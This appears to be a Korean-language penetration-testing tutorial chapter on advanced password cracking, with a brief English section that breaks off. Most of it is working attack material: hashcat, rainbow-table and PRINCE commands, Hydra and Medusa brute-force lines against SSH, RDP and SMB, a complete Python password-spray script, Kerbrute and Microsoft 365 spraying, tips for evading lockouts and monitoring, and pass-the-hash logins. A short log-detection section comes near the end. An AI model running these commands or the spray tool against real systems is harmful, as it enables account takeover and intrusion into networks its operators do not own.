> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 03 Advanced Cracking Techniques

## 0. 초보자를 위한 개념 이해

### 고급 크래킹 기법이란?

기본적인 사전 공격이나 브루트포스만으로는 복잡한 비밀번호를 크래킹하기 어렵다. 고급 크래킹 기법은 인간이 비밀번호를 만드는 패턴(P@ssw0rd, 이름+연도 등)을 활용한 규칙 기반 공격, 공간-시간 트레이드오프를 이용한 레인보우 테이블, 그리고 여러 기법을 조합하는 하이브리드 공격 등을 포함한다.

**왜 배우는가:**
```
고급 기법이 필요한 이유

단순 사전 공격의 한계:
  "password" → 발견 가능
  "P@ssw0rd!" → 사전에 없으면 실패

고급 기법으로 극복:
  규칙 기반: "password" → 변형 → "P@ssw0rd!", "p4ssword", ...
  마스크:    패턴 지정  → 4자리 대문자+숫자+특수문자 조합
  레인보우:  사전 계산  → 즉시 역산 (솔트 없는 해시에 효과적)
  Combinator: 두 단어 조합 → "hello"+"world" = "helloworld"
```

### 핵심 개념 정리

```
고급 크래킹 기법 비교

기법            대상                   강점
─────────────────────────────────────────────────
레인보우 테이블  솔트 없는 MD5/NTLM     사전 계산으로 즉시 역산
규칙 기반(Rules) 인간 패턴 비밀번호    알려진 단어의 변형 포착
하이브리드       중간 복잡도 비밀번호   단어+숫자/특수문자 조합
Prince Attack    긴 복잡한 비밀번호     단어 체인으로 긴 패스워드 생성
OMEN            통계적 패턴            마르코프 모델 기반 확률 순서
```

### 필요한 도구 및 환경
- **hashcat + rules**: `/usr/share/hashcat/rules/` 폴더의 규칙 파일
- **rainbowcrack**: 레인보우 테이블 생성/조회 (`apt install rainbowcrack`)
- **크래킹 전용 리스트**: SecLists, CrackStation 사전

### 기초 실습 예제
```bash
# 규칙 기반 공격 — hashcat 내장 규칙 적용
# best64.rule: 64가지 일반적인 비밀번호 변형 규칙
echo -n "P@ssw0rd" | md5sum | awk '{print $1}' > rule_test.hash

hashcat -m 0 -a 0 rule_test.hash \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# 마스크 공격 — 8자리 (대문자1+소문자5+숫자1+특수1) 패턴
# ?u=대문자 ?l=소문자 ?d=숫자 ?s=특수문자
hashcat -m 0 -a 3 rule_test.hash "?u?l?l?l?l?l?d?s"

# John 규칙 기반 — 내장 규칙 "KoreLogic" 활용
john --wordlist=rockyou.txt --rules=KoreLogic rule_test.hash
```

---

## 레인보우 테이블

### 원리

레인보우 테이블은 해시값 → 평문 역산을 위한 사전 계산 구조다.  
체인(chain) 단위로 저장해 순수 해시 딕셔너리 대비 공간을 대폭 줄인다.

```
평문 → [해시함수] → 해시 → [환원함수R] → 평문' → [해시함수] → 해시' → ...
시작값(startpoint)                                             끝값(endpoint)
```

- 저장: `(startpoint, endpoint)` 쌍만 저장
- 크래킹: 대상 해시에 환원함수 반복 적용 → 체인 끝값 매칭 → 체인 재생성으로 평문 복원
- 솔트가 있으면 테이블 무효화 → bcrypt/SHA512crypt 등은 레인보우 테이블 비효율

### rtgen — 레인보우 테이블 생성

```bash
# 설치
sudo apt install rainbowcrack
# 또는
git clone https://github.com/inAudible-NG/RainbowCrack-NG

# 기본 사용법
# rtgen <hash_algorithm> <charset> <min_len> <max_len> <table_idx> <chain_len> <chain_num> <part_idx>

# MD5, 소문자+숫자, 길이 1~6, 체인길이 3800, 체인수 33554432
rtgen md5 loweralpha-numeric 1 6 0 3800 33554432 0

# NTLM, 소문자, 길이 1~7
rtgen ntlm loweralpha 1 7 0 3800 33554432 0

# 테이블 정렬 (검색 전 필수)
rtsort *.rt

# 사용 가능한 문자셋 확인
cat /usr/share/rainbowcrack/charset.txt
```

### rcrack — 레인보우 테이블 크래킹

rcrack으로 미리 생성된 레인보우 테이블을 사용하여 해시를 크래킹합니다. 저장 공간과 계산 시간을 교환(time-memory trade-off)하는 방식입니다.

```bash
# 단일 해시 크래킹
rcrack /path/to/tables/ -h 5f4dcc3b5aa765d61d8327deb882cf99

# 해시 파일 크래킹
rcrack /path/to/tables/ -l hashes.txt

# NTLM 해시 크래킹
rcrack /opt/rainbowtables/ntlm/ -h 8846f7eaee8fb117ad06bdd830b7586c

# GPU 가속 버전 (rcracki_mt)
rcracki_mt -h 5f4dcc3b... /path/to/tables/*.rt
```

### 온라인 레인보우 테이블 서비스

CrackStation, hashes.com 등 온라인 레인보우 테이블 서비스를 활용합니다. MD5, SHA-1 등 솔트 없는 해시는 빠르게 조회할 수 있습니다.

```bash
# crackstation.net는 공개 API가 없어 웹 폼으로만 조회 가능
# 자동화가 필요하면 API를 제공하는 hashes.com을 사용
curl -s 'https://hashes.com/en/api/search' \
  -d "hashes[]=5f4dcc3b5aa765d61d8327deb882cf99"
```

---

## 룰 기반 변형

### Leetspeak 변형


고급 hashcat 크래킹 기법입니다. 규칙 기반 변형(`-r`)으로 단어에 숫자·특수문자를 추가하거나, 마스크 공격(`-a 3`)으로 특정 패턴을 전수 조사합니다. GPU 여러 개를 조합하면 크래킹 속도를 대폭 높일 수 있습니다.

```bash
# hashcat 리트스피크 규칙 파일 사용
hashcat -m 0 -a 0 hash.txt wordlist.txt \
  -r /usr/share/hashcat/rules/leetspeak.rule

# 커스텀 리트스피크 규칙 파일
cat << 'EOF' > leet.rule
# 기본 치환
sa4
se3
si1
so0
st7
sl1
sg9
# 조합 치환
sa4se3
sa4si1
so0se3si1
sa4se3si1so0
# 리트 + 첫글자 대문자
sa4 c
se3 c
sa4se3 c
EOF

hashcat -m 0 -a 0 hash.txt wordlist.txt -r leet.rule
```

### 대소문자 변형

대소문자 변형 규칙을 작성합니다. hashcat 규칙 파일로 동일 단어의 다양한 대소문자 조합을 자동 생성하여 크래킹 범위를 확장합니다.

```bash
cat << 'EOF' > case_rules.rule
# 소문자 전체
l
# 대문자 전체
u
# 첫 글자 대문자
c
# 첫 글자 소문자
C
# 토글 (1번째 문자 대소문자 전환)
T0
T1
T2
# 대소문자 교차 (odd/even 토글)
TN
# Title case (각 단어 첫글자 대문자)
E
EOF

hashcat -m 0 -a 0 hash.txt wordlist.txt -r case_rules.rule
```

### 숫자 추가 변형

숫자를 단어 앞뒤에 추가하는 변형 규칙입니다. 비밀번호에 연도나 숫자를 추가하는 일반적인 패턴을 커버합니다.

```bash
cat << 'EOF' > append_rules.rule
# 끝에 숫자 1개
$0
$1
$2
$3
$4
$5
$6
$7
$8
$9
# 끝에 연도
Az"2020"
Az"2021"
Az"2022"
Az"2023"
Az"2024"
Az"2025"
# 끝에 숫자 2개
$0$0
$1$1
$1$2$3
# 앞에 숫자
^1
^2
^1^2^3
# 앞뒤 숫자
^1$1
^2$2
# 특수문자 추가
$!
$@
$#
$$
$%
$!$1
Az"!"
Az"@"
Az"123!"
Az"2024!"
# 첫글자 대문자 + 숫자 끝
c $1
c $2
c Az"123"
c Az"2024"
c Az"2024!"
EOF
```

---

## PRINCE 공격

PRINCE (PRobability INfinite Chained Elements)는 조합 공격의 고급 형태다.  
입력 요소를 체인처럼 이어 붙여 확률 기반 순서로 후보를 생성한다.

```bash
# princeprocessor 설치
git clone https://github.com/hashcat/princeprocessor /opt/prince
cd /opt/prince/src && make
cp pp64.bin /usr/local/bin/pp

# 또는 패키지
sudo apt install hashcat-utils

# 기본 사용법 — 요소 조합 생성
pp /usr/share/wordlists/rockyou.txt | hashcat -m 0 -a 0 hash.txt --stdin

# 최소/최대 요소 수 제한
pp --pw-min=2 --pw-max=3 wordlist.txt | hashcat -m 0 hash.txt --stdin

# 최소/최대 길이 제한
pp --elem-cnt-min=2 --elem-cnt-max=4 \
   --pw-min=8 --pw-max=16 \
   wordlist.txt | hashcat -m 0 hash.txt --stdin

# 출력량 제한
pp --limit=1000000 wordlist.txt > prince_output.txt

# 케이스 순열 포함
pp --case-permute wordlist.txt | head -20

# 통계 출력
pp --keyspace wordlist.txt

# hashcat에서 직접 PRINCE 모드 (-a 9)
hashcat -m 0 -a 9 hash.txt wordlist.txt

# PRINCE + 규칙
hashcat -m 0 -a 9 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 마스크 공격 고급

### .hcmask 파일 사용

.hcmask 파일로 다수의 마스크를 순차적으로 적용합니다. 길이와 문자 집합이 다른 여러 마스크를 한 파일에 정의하여 자동으로 실행합니다.

```bash
# hcmask 파일: 한 줄 = 하나의 마스크
cat << 'EOF' > custom.hcmask
# 자주 쓰이는 패턴들
?u?l?l?l?l?d?d?d?d
?u?l?l?l?l?l?d?d?d
?u?l?l?l?l?d?d?d?d?s
?u?l?l?l?l?l?l?d?d
?u?l?l?l?l?l?l?d?d?s
?l?l?l?l?d?d?d?d
?l?l?l?l?l?d?d?d?d
?l?l?l?l?l?l?d?d?d?d
?d?d?d?d?d?d?d?d
?u?l?l?l?l?l?l?l
EOF

hashcat -m 0 -a 3 hash.txt custom.hcmask

# PACK으로 자동 생성된 hcmask 사용
python3 /opt/pack/maskgen.py analysis.txt \
  --targettime 3600 \
  --minlength 8 \
  --maxlength 12 \
  -o smart.hcmask

hashcat -m 1000 -a 3 ntlm_hashes.txt smart.hcmask
```

### 커스텀 문자셋 조합


고급 hashcat 크래킹 기법입니다. 규칙 기반 변형(`-r`)으로 단어에 숫자·특수문자를 추가하거나, 마스크 공격(`-a 3`)으로 특정 패턴을 전수 조사합니다. GPU 여러 개를 조합하면 크래킹 속도를 대폭 높일 수 있습니다.

```bash
# -1 ~ -4 로 최대 4개 커스텀 문자셋 정의
# 대소문자+특수문자 세트
hashcat -m 0 -a 3 hash.txt \
  -1 '!@#$%^&*' \
  -2 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' \
  -3 '0123456789' \
  ?2?2?2?2?2?3?3?1

# 국가별 키보드 레이아웃 특성 반영
hashcat -m 0 -a 3 hash.txt \
  -1 'qwertyuiopasdfghjklzxcvbnm' \
  ?1?1?1?1?1?1?1?1

# 알려진 패턴 prefix/suffix 고정
# "Pass" + 4자리 숫자
hashcat -m 0 -a 3 hash.txt 'Pass?d?d?d?d'

# "Summer" + 연도
hashcat -m 0 -a 3 hash.txt 'Summer?d?d?d?d'

# 점진적 길이 증가 (--increment)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a \
  --increment --increment-min=6 --increment-max=8
```

---

## 온라인 브루트포스 — Hydra

Hydra로 다양한 서비스에 온라인 브루트포스 공격을 수행합니다. HTTP, FTP, SSH, RDP 등 50개 이상의 프로토콜을 지원합니다.

```bash
# 기본 문법
hydra -l <user> -p <pass> <target> <service>
hydra -l <user> -P <passlist> <target> <service>
hydra -L <userlist> -P <passlist> <target> <service>

# SSH 브루트포스
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
hydra -L users.txt -P passwords.txt 192.168.1.10 ssh -t 4 -V

# FTP
hydra -l admin -P rockyou.txt ftp://192.168.1.10

# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://192.168.1.10/admin/

# HTTP POST 폼
hydra -l admin -P rockyou.txt 192.168.1.10 \
  http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"

# HTTPS
hydra -l admin -P rockyou.txt 192.168.1.10 \
  https-post-form "/login:username=^USER^&password=^PASS^:Login failed" -s 443

# RDP
hydra -l administrator -P rockyou.txt rdp://192.168.1.10

# SMB
hydra -l administrator -P rockyou.txt smb://192.168.1.10

# SMTP
hydra -l user@domain.com -P rockyou.txt smtp://mail.domain.com

# MySQL
hydra -l root -P rockyou.txt mysql://192.168.1.10

# 병렬 설정
hydra -l admin -P rockyou.txt 192.168.1.10 ssh \
  -t 4          \   # 동시 연결 수
  -w 30         \   # 타임아웃(초)
  -W 2          \   # 연결 간 대기(초)
  -V               # 자세한 출력

# 결과 저장
hydra -l admin -P rockyou.txt 192.168.1.10 ssh -o found.txt

# 이어서 시작 (-R)
hydra -R

# 특정 포트 지정
hydra -l admin -P rockyou.txt -s 2222 192.168.1.10 ssh

# 여러 호스트 동시 공격
hydra -l admin -P rockyou.txt -M hosts.txt ssh
```

---

## 온라인 브루트포스 — Medusa

Medusa는 병렬 처리 방식의 온라인 로그인 브루트포스 도구입니다. FTP, SSH, HTTP 등 다양한 프로토콜을 지원합니다.

```bash
# 기본 문법
medusa -h <host> -u <user> -P <passlist> -M <module>

# SSH
medusa -h 192.168.1.10 -u root -P rockyou.txt -M ssh

# FTP
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ftp

# HTTP Basic Auth
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M http \
  -m DIR:/admin

# HTTP 폼
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M web-form \
  -m FORM:/login.php \
  -m FORM-DATA:"post?username=&password=" \
  -m DENY-SIGNAL:"Login failed"

# SMB
medusa -h 192.168.1.10 -u administrator -P rockyou.txt -M smbnt

# 병렬 설정
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh \
  -t 4   \   # 동시 스레드
  -T 2   \   # 호스트당 동시 연결
  -f         # 첫 성공 시 중단

# 여러 호스트
medusa -H hosts.txt -u admin -P rockyou.txt -M ssh

# 결과 저장
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh -O results.txt

# 지원 모듈 목록
medusa -d
```

---

## Python 3.10+ 패스워드 스프레이 도구

Python으로 패스워드 스프레이 도구를 구현합니다. 계정 잠금을 피하기 위해 여러 계정에 소수의 비밀번호만 시도하고 시간 간격을 조절합니다.

```python
#!/usr/bin/env python3
"""
패스워드 스프레이 도구 (HTTP 폼 기반)
사용법: python3 password_spray.py -u users.txt -p passwords.txt -t https://target.com/login
"""

import argparse
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] requests 라이브러리 필요: pip install requests", file=sys.stderr)
    sys.exit(1)


@dataclass
class SprayConfig:
    target_url: str
    userlist: Path
    passlist: Path
    user_field: str = "username"
    pass_field: str = "password"
    fail_string: str = "Invalid"
    success_string: str = ""
    threads: int = 3
    delay: float = 1.0          # 요청 간 딜레이(초)
    timeout: int = 10
    proxy: Optional[str] = None
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    extra_fields: dict[str, str] = field(default_factory=dict)
    output_file: Optional[Path] = None
    spray_mode: bool = True     # True: 1패스워드씩 전체 유저, False: 1유저에 전체 패스워드


@dataclass
class Credential:
    username: str
    password: str
    success: bool = False
    status_code: int = 0
    response_len: int = 0
    error: str = ""


class RateLimiter:
    """스레드 안전 레이트 리미터."""

    def __init__(self, delay: float) -> None:
        self.delay = delay
        self._lock = threading.Lock()
        self._last_request = 0.0

    def wait(self) -> None:
        with self._lock:
            now = time.monotonic()
            elapsed = now - self._last_request
            if elapsed < self.delay:
                time.sleep(self.delay - elapsed)
            self._last_request = time.monotonic()


def make_session(config: SprayConfig) -> requests.Session:
    """재시도 로직이 포함된 requests 세션 생성."""
    session = requests.Session()
    session.headers["User-Agent"] = config.user_agent

    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    if config.proxy:
        session.proxies = {"http": config.proxy, "https": config.proxy}
        session.verify = False  # 프록시 사용 시 TLS 검증 우회

    return session


def attempt_login(
    config: SprayConfig,
    username: str,
    password: str,
    session: requests.Session,
    rate_limiter: RateLimiter,
) -> Credential:
    """단일 로그인 시도. Credential 객체 반환."""
    cred = Credential(username=username, password=password)
    rate_limiter.wait()

    payload: dict[str, str] = {
        config.user_field: username,
        config.pass_field: password,
        **config.extra_fields,
    }

    try:
        resp = session.post(
            config.target_url,
            data=payload,
            timeout=config.timeout,
            allow_redirects=True,
        )
        cred.status_code = resp.status_code
        cred.response_len = len(resp.content)

        # 성공 판단 로직
        if config.success_string:
            cred.success = config.success_string in resp.text
        else:
            cred.success = config.fail_string not in resp.text

        # 계정 잠금 탐지
        lockout_indicators = [
            "account locked", "too many attempts", "locked out",
            "temporarily disabled", "계정이 잠겼", "잠금",
        ]
        for indicator in lockout_indicators:
            if indicator.lower() in resp.text.lower():
                cred.error = f"LOCKOUT_DETECTED: {indicator}"
                cred.success = False
                break

    except requests.exceptions.ConnectionError as e:
        cred.error = f"CONNECTION_ERROR: {e}"
    except requests.exceptions.Timeout:
        cred.error = "TIMEOUT"
    except requests.exceptions.TooManyRedirects:
        cred.error = "TOO_MANY_REDIRECTS"
    except requests.exceptions.RequestException as e:
        cred.error = f"REQUEST_ERROR: {e}"

    return cred


def load_list(path: Path) -> list[str]:
    """파일에서 줄 단위로 로드, 빈 줄·주석 제거."""
    if not path.exists():
        print(f"[!] 파일 없음: {path}", file=sys.stderr)
        sys.exit(1)
    return [
        line.strip()
        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines()
        if line.strip() and not line.startswith("#")
    ]


def spray_attack(config: SprayConfig) -> list[Credential]:
    """
    스프레이 모드: 각 패스워드를 모든 유저에 시도.
    계정 잠금 방지를 위해 패스워드 단위로 딜레이 부여.
    """
    users = load_list(config.userlist)
    passwords = load_list(config.passlist)

    print(f"[*] 대상: {config.target_url}")
    print(f"[*] 유저 수: {len(users)} | 패스워드 수: {len(passwords)}")
    print(f"[*] 스레드: {config.threads} | 딜레이: {config.delay}s")
    print(f"[*] 총 시도 수: {len(users) * len(passwords):,}\n")

    found: list[Credential] = []
    rate_limiter = RateLimiter(config.delay)

    # 스프레이 모드: 패스워드 → 유저 순서
    if config.spray_mode:
        for i, password in enumerate(passwords, 1):
            print(f"[*] 패스워드 {i}/{len(passwords)}: {password}")

            tasks: list[tuple[str, str]] = [(u, password) for u in users]

            with ThreadPoolExecutor(max_workers=config.threads) as executor:
                session = make_session(config)
                futures = {
                    executor.submit(
                        attempt_login, config, u, p, session, rate_limiter
                    ): (u, p)
                    for u, p in tasks
                }

                for future in as_completed(futures):
                    cred = future.result()
                    if cred.error and "LOCKOUT" in cred.error:
                        print(f"[!] 계정 잠금 감지: {cred.username} — {cred.error}")
                        print("[!] 공격 중단 권고")
                    elif cred.success:
                        print(f"\n[+] 성공! {cred.username}:{cred.password}")
                        found.append(cred)
                    else:
                        pass  # 실패는 조용히

            # 패스워드 간 추가 딜레이 (계정 잠금 방지)
            if i < len(passwords):
                spray_delay = max(config.delay * 5, 30.0)
                print(f"[*] 다음 패스워드까지 {spray_delay:.0f}초 대기...")
                time.sleep(spray_delay)
    else:
        # 단일 유저 + 전체 패스워드
        for user in users:
            print(f"[*] 유저: {user}")
            with ThreadPoolExecutor(max_workers=config.threads) as executor:
                session = make_session(config)
                futures = {
                    executor.submit(
                        attempt_login, config, user, p, session, rate_limiter
                    ): p
                    for p in passwords
                }
                for future in as_completed(futures):
                    cred = future.result()
                    if cred.success:
                        print(f"[+] 성공! {cred.username}:{cred.password}")
                        found.append(cred)

    return found


def save_results(results: list[Credential], output_path: Path) -> None:
    lines = [f"{c.username}:{c.password}" for c in results if c.success]
    output_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"[*] 결과 저장: {output_path}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="HTTP 폼 패스워드 스프레이 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  # 기본 스프레이 (패스워드 1개씩 전체 유저)
  python3 password_spray.py -u users.txt -p passwords.txt \\
    -t https://target.com/login --fail-str "Login failed"

  # 커스텀 필드명
  python3 password_spray.py -u users.txt -p passwords.txt \\
    -t https://target.com/login \\
    --user-field email --pass-field passwd

  # 프록시 경유 (Burp Suite)
  python3 password_spray.py -u users.txt -p pass.txt \\
    -t https://target.com/login --proxy http://127.0.0.1:8080

  # 단일 유저 완전 브루트포스 모드
  python3 password_spray.py -u single_user.txt -p rockyou.txt \\
    -t https://target.com/login --no-spray -t 8 --delay 0.5
        """,
    )
    parser.add_argument("-u", "--userlist", type=Path, required=True, help="유저 목록 파일")
    parser.add_argument("-p", "--passlist", type=Path, required=True, help="패스워드 목록 파일")
    parser.add_argument("-t", "--target", required=True, help="로그인 URL")
    parser.add_argument("--user-field", default="username", help="유저명 폼 필드 (기본: username)")
    parser.add_argument("--pass-field", default="password", help="패스워드 폼 필드 (기본: password)")
    parser.add_argument("--fail-str", default="Invalid", help="실패 응답에 포함된 문자열")
    parser.add_argument("--success-str", default="", help="성공 응답에 포함된 문자열")
    parser.add_argument("--threads", type=int, default=3, help="스레드 수 (기본: 3)")
    parser.add_argument("--delay", type=float, default=1.0, help="요청 간 딜레이(초, 기본: 1.0)")
    parser.add_argument("--timeout", type=int, default=10, help="타임아웃(초)")
    parser.add_argument("--proxy", help="프록시 URL (예: http://127.0.0.1:8080)")
    parser.add_argument("--no-spray", action="store_true", help="스프레이 모드 비활성화 (유저별 전체 패스워드)")
    parser.add_argument("-o", "--output", type=Path, help="결과 저장 파일")
    parser.add_argument("--extra-field", action="append", metavar="KEY=VALUE",
                        help="추가 폼 필드 (예: --extra-field csrf_token=abc123)")
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    # 추가 폼 필드 파싱
    extra_fields: dict[str, str] = {}
    if args.extra_field:
        for item in args.extra_field:
            try:
                k, v = item.split("=", 1)
                extra_fields[k] = v
            except ValueError:
                print(f"[!] 잘못된 --extra-field 형식: {item}", file=sys.stderr)

    config = SprayConfig(
        target_url=args.target,
        userlist=args.userlist,
        passlist=args.passlist,
        user_field=args.user_field,
        pass_field=args.pass_field,
        fail_string=args.fail_str,
        success_string=args.success_str,
        threads=args.threads,
        delay=args.delay,
        timeout=args.timeout,
        proxy=args.proxy,
        extra_fields=extra_fields,
        output_file=args.output,
        spray_mode=not args.no_spray,
    )

    # URL 검증
    parsed = urlparse(config.target_url)
    if not parsed.scheme or not parsed.netloc:
        print(f"[!] 잘못된 URL: {config.target_url}", file=sys.stderr)
        sys.exit(1)

    try:
        results = spray_attack(config)
    except KeyboardInterrupt:
        print("\n[!] 사용자 중단")
        sys.exit(0)

    print(f"\n[*] 완료 — 성공: {len(results)}건")
    for cred in results:
        print(f"    {cred.username}:{cred.password}")

    if args.output and results:
        save_results(results, args.output)


if __name__ == "__main__":
    main()
```

---

## 실전 명령어 모음

### CrackMapExec 패스워드 스프레이 (SMB/WinRM)

CrackMapExec으로 SMB/WinRM 프로토콜에 패스워드 스프레이를 수행합니다. 도메인 환경에서 유효한 자격증명을 찾는 데 효율적입니다.

```bash
# SMB 스프레이
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt \
  --continue-on-success

# 단일 패스워드로 전체 도메인
crackmapexec smb 192.168.1.10 -u users.txt -p 'Password2024!' \
  --continue-on-success

# WinRM
crackmapexec winrm 192.168.1.10 -u users.txt -p passwords.txt

# LDAP (AD)
crackmapexec ldap 192.168.1.10 -u users.txt -p 'Password2024!'

# 성공 시 자동으로 [+] 표시
# 계정 잠금 상태는 STATUS_ACCOUNT_LOCKED_OUT 표시
```

### Kerbrute — Kerberos 기반 스프레이 (계정 잠금 위험 낮음)

Kerbrute로 Kerberos 기반 사용자 열거와 패스워드 스프레이를 수행합니다. 이벤트 로그 4625 대신 Kerberos 오류 코드를 사용하여 탐지를 낮춥니다.

```bash
# 설치
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64 && mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# 유저 열거
kerbrute userenum --dc 192.168.1.10 -d domain.local users.txt

# 패스워드 스프레이
kerbrute passwordspray --dc 192.168.1.10 -d domain.local users.txt 'Password2024!'

# 단일 유저 브루트포스
kerbrute bruteuser --dc 192.168.1.10 -d domain.local passwords.txt jdoe

# 결과 저장
kerbrute passwordspray --dc 192.168.1.10 -d domain.local \
  users.txt 'Password2024!' -o results.txt
```

### Spray365 (Microsoft 365)

Spray365는 Microsoft 365 환경에서 패스워드 스프레이를 수행합니다. 스마트 잠금을 우회하기 위해 시간 간격과 IP를 자동으로 조절합니다.

```bash
# 설치
pip install spray365

# M365 스프레이
spray365 spray -e emails.txt -p passwords.txt \
  --delay 1800    # 30분 딜레이 (계정 잠금 방지)

# 스마트 잠금 정책 고려: 보통 10분/10회 → 1시간당 1패스워드 권장
```

### o365spray

o365spray로 Microsoft 365 계정 열거와 패스워드 스프레이를 수행합니다. 여러 엔드포인트를 활용하여 계정 잠금을 최소화합니다.

```bash
git clone https://github.com/0xZDH/o365spray /opt/o365spray

# 도메인 검증
python3 /opt/o365spray/o365spray.py --validate --domain target.com

# 유저 열거
python3 /opt/o365spray/o365spray.py --enum -U users.txt --domain target.com

# 패스워드 스프레이
python3 /opt/o365spray/o365spray.py --spray \
  -U valid_users.txt \
  -P passwords.txt \
  --domain target.com \
  --sleep 60 \      # 요청 간 60초
  --count 1         # 패스워드 1개씩
```

---

## 계정 잠금 정책 우회 전략

도메인의 계정 잠금 정책을 확인합니다. 잠금 임계값, 관찰 기간, 잠금 지속 시간을 파악하여 탐지 없이 스프레이할 최대 시도 횟수를 결정합니다.

```bash
# 1. 잠금 임계값 확인 (AD 환경)
crackmapexec smb 192.168.1.10 -u user -p pass --pass-pol

# net 명령어 (Windows)
net accounts /domain

# 2. 잠금 임계값보다 적게 시도
# 예: 잠금 5회 → 패스워드당 4회만 시도

# 3. 잠금 초기화 시간 기다리기
# 보통 30분~1시간 → 그 이상 대기

# 4. 관찰 안 되는 시간대 공격 (새벽 등)

# 5. Kerberos 사전 인증 실패는 잠금 카운트에서 제외되는 경우 있음
# → Kerbrute 사용

# 6. 스프레이 모드: 1패스워드 × 전체 유저 (같은 패스워드로 여러 유저)
# 개별 유저 잠금 카운트 올라가는 속도 최소화
```

---

## 크래킹 결과 활용


고급 hashcat 크래킹 기법입니다. 규칙 기반 변형(`-r`)으로 단어에 숫자·특수문자를 추가하거나, 마스크 공격(`-a 3`)으로 특정 패턴을 전수 조사합니다. GPU 여러 개를 조합하면 크래킹 속도를 대폭 높일 수 있습니다.

```bash
# hashcat pot 파일에서 결과 추출
hashcat -m 1000 --show ntlm_hashes.txt
cat ~/.hashcat/hashcat.potfile | grep -f ntlm_hashes.txt

# john pot 파일
cat ~/.john/john.pot

# 크래킹된 패스워드로 Pass-the-Hash
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  administrator@192.168.1.10

# 크래킹된 패스워드로 직접 접근
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123'
impacket-smbclient domain/administrator:Password123@192.168.1.10
```

---

<!-- detect-validate-22 -->
## 고급 크래킹·크레덴셜 재사용 횡적이동 탐지 검증

고급 크래킹은 *하이브리드/PCFG·분산 크래킹·복원한 자격증명의 횡적 재사용*으로 범위를 넓힌다. 방어자는 **크래킹된 자격증명으로의 비정상 인증이 탐지되는가**를 검증해야 한다. 검증은 **소유 도메인**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| 하이브리드/PCFG | 구조적 패스워드 | 엔트로피 정책 | 구조 패턴 일치율 |
| 분산 크래킹 | 고속 연산 | 느린 해시 | (오프라인 — 직접 탐지 불가) |
| 크레덴셜 재사용 횡적이동 | 패스워드 공유 | 계정별 고유·LAPS | 동일 cred 다중 호스트 로그온 |
| Pass-the-hash 연계 | NTLM 재사용 | Kerberos 강제·NTLM 제한 | 비정상 NTLM 인증 |

### 방어 검증 (직접 확인)

```bash
# 1) 동일 자격증명의 다중 출처 인증 탐지(소유 도메인) — 횡적이동 신호
grep -hE "Accepted .* for" /var/log/auth.log 2>/dev/null | awk '{print $9}' | sort | uniq -c | sort -rn | head
# 2) 크래킹 도구의 원격 실행 흔적 점검(소유 호스트)
grep -hE "evil-winrm|impacket|wmiexec|psexec|crackmapexec" /var/log/syslog /var/log/auth.log 2>/dev/null | tail
```

> 고급 크래킹 방어는 *깬 자격증명이 어디까지 통하는가*다 — "강한 패스워드 쓴다"와 "한 호스트가 털려도 그 cred가 다른 호스트엔 안 통한다"는 다르다. 소유 도메인에서 자격증명 재사용 로그온을 직접 확인한다([[54_Active_Directory_Attacks]], [[17_Red_Team_Operations]], [[13_SOC_Blue_Team]]).

**최신 기법·통제 (2025–2026):**
- 프린스·마르코프·ML 후보생성이 발전 — 정책·모니터링으로 대응. 검증: 정책하 패스워드가 후보공간에서 저항하는가([[16_Cryptography]])
- 크래킹 대상은 소유/승인 해시만 — 합법성 통제

---

<a name="english"></a>

# 03 Advanced Cracking Techniques

## Rainbow Tables

### Principles

Rainbow tables are a precomputed structure for reversing hash values back to plaintext.  
They are stored in chain units, dramatically reducing space compared to a pure hash dictionary.

```
Plaintext → [Hash Function] → Hash → [Reduction Function R] → Plaintext' → [Hash Function] → Hash' → ...
startpoint                                                                                    endpoint
```

- Storage: Only `(startpoint, endpoint)` pairs are stored
- Cracking: Repeatedly apply the reduction function to the target hash → match chain endpoints → regenerate the chain to recover the plaintext
- Salt invalidates the table → bcrypt/SHA512crypt etc. are inefficient against rainbow tables

### rtgen — Rainbow Table Generation

```bash
# Installation
sudo apt install rainbowcrack
# Or
git clone https://github.com/inAudible-NG/RainbowCrack-NG

# Basic usage
# rtgen <hash_algorithm> <charset> <min_len> <max_len> <table_idx> <chain_len> <chain_num> <part_idx>

# MD5, lowercase+digits, length 1~6, chain length 3800, chain count 33554432
rtgen md5 loweralpha-numeric 1 6 0 3800 33554432 0

# NTLM, lowercase, length 1~7
